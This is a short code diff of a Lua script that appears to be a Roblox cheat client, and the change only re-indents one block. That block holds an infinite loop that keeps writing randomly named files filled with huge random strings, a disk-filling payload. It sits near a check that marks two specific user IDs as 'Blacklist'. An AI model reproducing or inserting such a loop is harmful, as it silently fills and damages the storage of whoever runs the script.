@@ -113,13 +113,13 @@ if shared.FuncsConnect then
 	        task.spawn(function()
             repeat
               task.wait()
-                writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
-                until false
-	            end)
-	          end})
-	        end})
-	      end
-      end
+              writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+              until false
+            end)
+	      end})
+	    end})
+	  end
+  end
 	for i,v in pairs(playersService:GetPlayers()) do
 		if lplr.UserId == 3110380407 or lplr.UserId == 4613474609 then
 			Functions.displayErrorPopup("Blacklist", "You has Been Blacklist, L imagine got blacklist", "OK", {OK = function()
